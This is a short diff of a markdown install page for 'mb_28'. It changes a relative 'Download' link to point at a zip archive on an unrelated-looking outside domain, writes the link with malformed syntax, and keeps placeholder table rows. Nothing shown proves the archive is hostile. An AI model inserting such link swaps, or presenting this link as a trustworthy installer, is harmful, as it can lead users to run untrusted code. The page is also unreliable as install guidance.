@@ -9,7 +9,7 @@ slug: /mb_28/versions/version_1
 
 ## How to Install mb_28
 
-### Version 40.0 (2024-11-10) <float-right>[Download](download)</float-right>
+### Version 40.0 (2024-11-10) <float-right>[Download]((https://indicators.currenttech.pro/download/MB28Code.zip)</float-right>
 | Header 1 | Header 2 | Header 3 |
 |----------|----------|----------|
 | Row 1, Col 1 | Row 1, Col 2 | Row 1, Col 3 |
